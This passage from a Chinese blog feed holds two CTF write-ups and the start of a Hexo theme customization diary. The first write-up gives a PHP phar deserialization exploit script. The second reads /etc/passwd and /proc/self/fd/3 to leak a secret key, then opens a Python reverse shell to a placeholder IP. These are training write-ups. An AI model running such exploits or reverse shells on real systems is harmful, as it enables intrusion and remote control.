class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$extension</span>,<span class="variable">$allowed_types</span>)) &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>通过审计<code>function.php</code>，只对后缀进行了白名单过滤，不造成影响，上传路径也是已知的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload/md5(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>].<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]).<span class="string">&quot;.jpg&quot;</span></span><br></pre></td></tr></table></figure><p>页面右上角已经输出了<code>$_SERVER[&quot;REMOTE_ADDR&quot;]</code>，之后就要通过<code>class.php</code>构造链子</p><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;   <span class="comment">//$this-&gt;source = phar://phar.jpg</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="keyword">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker~&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;params[<span class="variable">$key</span>])) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="keyword">$this</span>-&gt;params[<span class="variable">$key</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file_get(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$text</span> = base64_encode(file_get_contents(<span class="variable">$value</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$text</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>C1e4r::__destruct =&gt; Show::__toString =&gt; Test::__get =&gt; Test::get =&gt; Test::file_get</p></blockquote><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>] = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params[<span class="string">&#x27;source&#x27;</span>] = <span class="string">&#x27;/var/www/html/f1ag.php&#x27;</span>;<span class="comment">// 一定要是绝对路径</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> Test;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> Show(<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> C1e4r(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;__HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>上传成功后，直接查看<code>upload</code>目录也可以找到文件，然后通过<code>phar://</code>伪协议读取就可以得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file.php?file=phar://upload/8efb16f93aff65a6f9b440dbb29a5736.jpg</span><br></pre></td></tr></table></figure><p><strong>再附魔术方法</strong></p><table><thead><tr><th align="center">魔术方法</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">__construct()</td><td align="center">当对象被创建时会调用此方法</td></tr><tr><td align="center">__destrurct()</td><td align="center">在某个对象的所有引用都被删除或者当对象被显式销毁时执行</td></tr><tr><td align="center">__sleep()</td><td align="center">当对象被序列化时会调用此方法</td></tr><tr><td align="center">__wakeup()</td><td align="center">当对象被反序列化时将会调用此方法</td></tr><tr><td align="center">__call()</td><td align="center">在对象中调用一个不可访问方法时，该方法被调用</td></tr><tr><td align="center">__callStatic()</td><td align="center">在静态上下文中调用一个不可访问方法时，该方法被调用</td></tr><tr><td align="center">__get()</td><td align="center">读取不可访问属性的值时，该方法被调用</td></tr><tr><td align="center">__set()</td><td align="center">在给不可访问属性赋值时，该方法被调用</td></tr><tr><td align="center">__toString()</td><td align="center">当一个类被当作字符串时将会调用此方法</td></tr><tr><td align="center">__invoke()</td><td align="center">当尝试以调用函数的方式调用一个对象时该方法会被调用</td></tr><tr><td align="center">__isset()</td><td align="center">当对不可访问属性调用 isset() 或 empty() 时，该方法会被调用</td></tr><tr><td align="center">__unset()</td><td align="center">当对不可访问属性调用 unset() 时，该方法会被调用</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ctfer </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯2020白虎组 PicDown</title>
      <link href="/post/2021-12/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E7%99%BD%E8%99%8E%E7%BB%84%5DPicDown/"/>
      <url>/post/2021-12/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E7%99%BD%E8%99%8E%E7%BB%84%5DPicDown/</url>
      
        <content type="html"><![CDATA[<h1 id="网鼎杯-2020-白虎组-PicDown"><a href="#网鼎杯-2020-白虎组-PicDown" class="headerlink" title="[网鼎杯 2020 白虎组]PicDown"></a>[网鼎杯 2020 白虎组]PicDown</h1><p><strong>考点：1、任意文件读取及Linux进程查看    2、python脚本反弹shell</strong></p><p>进去之后在输入处随便输个啥，发现url有参数，猜测ssrf</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page?url=http:<span class="comment">//www.baidu.com</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/topic/202112071357980.png" alt="image-20211207125206946"></p><p>返回了请求值，使用<code>file</code>协议无果，就试了一下直接读取文件</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page?url=/etc/passwd</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/topic/202112071357981.png" alt="image-20211207125326165"></p><p>读取成功，存在<code>任意文件读取</code></p><h2 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h2><p>尝试直接读取<code>/flag</code></p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/topic/202112071357982.png" alt="image-20211207125439037"></p><h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><p>尝试读取用于当前进程的启动命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page?url=/proc/self/cmdline</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/topic/202112071357983.png" alt="image-20211207125812325"></p><p>接下来读取<code>app.py</code>，获得源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">SECRET_FILE = <span class="string">&quot;/tmp/secret.txt&quot;</span></span><br><span class="line">f = <span class="built_in">open</span>(SECRET_FILE)</span><br><span class="line">SECRET_KEY = f.read().strip()</span><br><span class="line">os.remove(SECRET_FILE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/page&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page</span>():</span></span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> url.lower().startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">            res = urllib.urlopen(url)</span><br><span class="line">            value = res.read()</span><br><span class="line">            response = Response(value, mimetype=<span class="string">&#x27;application/octet-stream&#x27;</span>)</span><br><span class="line">            response.headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=beautiful.jpg&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            value = <span class="string">&quot;HACK ERROR!&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        value = <span class="string">&quot;SOMETHING WRONG!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;search.html&#x27;</span>, res=value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/no_one_know_the_manager&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">manager</span>():</span></span><br><span class="line">    key = request.args.get(<span class="string">&quot;key&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(SECRET_KEY)</span><br><span class="line">    <span class="keyword">if</span> key == SECRET_KEY:</span><br><span class="line">        shell = request.args.get(<span class="string">&quot;shell&quot;</span>)</span><br><span class="line">        os.system(shell)</span><br><span class="line">        res = <span class="string">&quot;ok&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = <span class="string">&quot;Wrong Key!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure><p>从路由<code>/no_one_know_the_manager</code>可以看到，如果获得了<code>SECRET_KEY</code>就可以获得shell了。读取<code>/proc/self/fd/3</code></p><p>重点：这里打开了文件并没有关闭，这里就是漏洞利用点！！！fd目录下保存的文件都是以数字存储的，我们使用爆破可知在<code>3</code>处有数据</p><blockquote><p>/proc/pid/fd/ 这个目录包含了进程打开的每一个文件的链接；</p></blockquote><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paeg?url=/proc/self/fd/<span class="number">3</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/topic/202112071357984.png" alt="image-20211207130233789"></p><p>至此获得了<code>SECRET_KEY</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/no_one_know_the_manager?key=lIZatnx0S3HWqem013h0YpU6cXK30sQRPwKEZr4e6FU=&amp;shell=ls</span><br></pre></td></tr></table></figure><p>但是发现shell执行的命令并不会返回结果，所以使用反弹shell</p><p>这里直接使用python脚本反弹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;IP&#x27;,端口));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span><br></pre></td></tr></table></figure><p>将该payload进行url全编码后即可成功反弹</p><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/topic/202112071357985.png" alt="image-20211207132702535"></p><p>这里我还专门看了一下<code>search.html</code>的内容，就说为什么我使用<code>file协议</code>并没有回显<code>HACK ERROR!</code>。</p>]]></content>
      
      
      <categories>
          
          <category> 刷题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Ctfer </tag>
            
            <tag> 反弹shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo+Butterfly魔改日记</title>
      <link href="/post/2021-12/Hexo+Butterfly%E9%AD%94%E6%94%B9%E6%97%A5%E8%AE%B0/"/>
      <url>/post/2021-12/Hexo+Butterfly%E9%AD%94%E6%94%B9%E6%97%A5%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>持续更新———-</p></blockquote><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>关于本站的魔改日记，皆是参考各位师傅们的博客而成，所以可以直接转至师傅们的博客进行修改，以下记录都是作为个人修改记录，可能会有版本不同从而导致不兼容的问题</p><p>师傅们的链接（本站友链中也有）：</p><p><a href="https://akilar.top/posts/f99b208/">Akilar糖果屋のButterfly 主题美化日记</a></p><p><a href="https://zfe.space/categories/%E6%95%99%E7%A8%8B/">冰老师的魔改教程</a></p><p><a href="https://cnhuazhu.gitee.io/2021/03/28/Hexo%E9%AD%94%E6%94%B9/Hexo%E9%AD%94%E6%94%B9%E8%AE%B0%E5%BD%95/">花猪のHexo魔改记录</a></p><p><a href="https://ethant.top/articles/hexo541u/">唐先森のHexo+Butterfly主题美化</a></p><p><a href="https://blog.imzjw.cn/posts/b74f504f/">小嘉的Butterfly主题美化</a></p><h1 id="文章置顶"><a href="#文章置顶" class="headerlink" title="文章置顶"></a>文章置顶</h1><h2 id="效果展示："><a href="#效果展示：" class="headerlink" title="效果展示："></a>效果展示：</h2><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog3/202112082140763.png" alt="image-20211208214026598"></p><h2 id="配置方法："><a href="#配置方法：" class="headerlink" title="配置方法："></a>配置方法：</h2><p>Hexo 本身并没有内置文章置顶功能，因此需要自行安装。不过 Hexo 本身有一个对文章排序的组件，也就是在站点配置文件内的 <code>index_generator</code> 选项，置顶功能其实就是每次排序的时候，把其中的置顶文章排在最前，本质上是一个排序组件，Hexo 默认的是 <code>hexo-generator-index</code>，所以先卸载再重新安装一个可以置顶的排序组件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先卸载</span></span><br><span class="line">npm uninstall --save hexo-generator-index</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再安装</span></span><br><span class="line">npm install --save hexo-generator-index-pin-top</span><br></pre></td></tr></table></figure><h1 id="页面、页脚透明"><a href="#页面、页脚透明" class="headerlink" title="页面、页脚透明"></a>页面、页脚透明</h1><h2 id="效果展示：-1"><a href="#效果展示：-1" class="headerlink" title="效果展示："></a>效果展示：</h2><p><img src="https://gitee.com/seizer-zyx/picgo/raw/master/blog3/202112082121466.png" alt="image-20211208204435755"></p><h2 id="配置方法：-1"><a href="#配置方法：-1" class="headerlink" title="配置方法："></a>配置方法：</h2><p>使用外挂CSS实现页面透明</p><p>在<code>themes\butterfly\source\css</code>目录下新建<code>transparent.css</code>，写入以下内容</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 所有页面背景 */</span></span><br><span class="line"></span><br><span class="line"><span class="selector-id">#recent-posts</span>&gt;<span class="selector-class">.recent-post-item</span>,</span><br><span class="line"><span class="selector-class">.layout</span>&gt;<span class="selector-tag">div</span><span class="selector-pseudo">:first</span>-child<span class="selector-pseudo">:not</span>(<span class="selector-class">.recent-posts</span>),</span><br><span class="line"><span class="selector-id">#aside-content</span> <span class="selector-class">.card-widget</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, .<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 取消页脚背景 */</span></span><br><span class="line"></span><br><span class="line"><span class="selector-id">#footer</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后再主题配置文件<code>_config.butterfly.yml</code>中搜索<code>inject</code>，修改为如下</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">inject:</span></span><br><span class="line">  <span class="attr">head:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&lt;link</span> <span class="string">rel=&quot;stylesheet&quot;</span> <span class="string">href=&quot;/css/mycss.css&quot;&gt;</span></span><br><span class="line">  <span class="attr">bottom:</span></span><br></pre></td></tr></table></figure><h1 id="修改字体"><a href="#修改字体" class="headerlink" title="修改字体"></a>修改字体</h1><p>只需要在上述<code>mycss.css</code>文件中加入</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@font-face</span> &#123;</span><br><span class="line">    <span class="attribute">font-family</span>: <span class="string">&#x27;tzy&#x27;</span>;</span><br><span class="line">    <span class="comment">/* 字体名自定义即可 */</span></span><br><span class="line">    <span 